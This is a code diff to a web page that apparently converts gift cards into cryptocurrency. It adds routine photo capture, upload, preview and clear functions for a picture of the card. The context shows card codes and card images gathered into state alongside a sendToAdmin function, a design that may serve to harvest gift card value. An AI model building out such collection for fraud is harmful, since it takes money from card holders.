@@ -534,7 +534,7 @@ footer{border-top:1px solid var(--glass-border);padding:40px 48px;display:flex;j
 <div class="cv-field">
   <div class="cv-label"><div class="cv-label-dot" style="background:var(--cyan)"></div>Card Photo / Upload</div>
   <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
-    <button class="cv-btn-back" type="button" onclick="triggerFileInput()">📸 Take Photo</button>
+    <button class="cv-btn-back" type="button" onclick="triggerCamera()">📸 Take Photo</button>
     <button class="cv-btn-back" type="button" onclick="triggerFileUpload()">📁 Upload from Gallery</button>
     <button class="cv-btn-back" type="button" onclick="clearPhoto()">🗑️ Clear</button>
     <input id="cv-photo-camera" type="file" accept="image/*" capture="environment" style="display:none" onchange="handlePhotoSelect(event)">
@@ -817,6 +817,56 @@ function sendToAdmin(cardData) {
    CONVERSION FLOW
 ════════════════════════════════ */
 let CV={step:1,cardType:'apple',amount:null,crypto:null,wallet:'',cardCode:'',cardImageData:null};
+
+// ========== PHOTO FUNCTIONS ==========
+function triggerCamera() {
+    const cameraInput = document.getElementById('cv-photo-camera');
+    if (cameraInput) cameraInput.click();
+}
+
+function triggerFileUpload() {
+    const galleryInput = document.getElementById('cv-photo-gallery');
+    if (galleryInput) galleryInput.click();
+}
+
+function handlePhotoSelect(e) {
+    const f = e.target.files && e.target.files[0];
+    if (!f) return;
+    
+    const reader = new FileReader();
+    reader.onload = function(ev) {
+        const url = ev.target.result;
+        CV.cardImageData = url;
+        const previewImg = document.getElementById('cv-photo-preview');
+        const photoMeta = document.getElementById('cv-photo-meta');
+        if (previewImg) {
+            previewImg.src = url;
+            previewImg.style.display = 'block';
+        }
+        if (photoMeta) photoMeta.textContent = f.name + ' · ' + Math.round(f.size/1024) + 'KB';
+    };
+    reader.readAsDataURL(f);
+    
+    // Clear the input value so the same file can be selected again
+    e.target.value = '';
+}
+
+function clearPhoto() {
+    CV.cardImageData = null;
+    const previewImg = document.getElementById('cv-photo-preview');
+    const photoMeta = document.getElementById('cv-photo-meta');
+    const cameraInput = document.getElementById('cv-photo-camera');
+    const galleryInput = document.getElementById('cv-photo-gallery');
+    
+    if (previewImg) {
+        previewImg.style.display = 'none';
+        previewImg.src = '';
+    }
+    if (photoMeta) photoMeta.textContent = '';
+    if (cameraInput) cameraInput.value = '';
+    if (galleryInput) galleryInput.value = '';
+}
+// ========== END PHOTO FUNCTIONS ==========
 
 function openConvert(){
   CV={step:1,cardType:'apple',amount:null,crypto:null,wallet:'',cardCode:'',cardImageData:null};
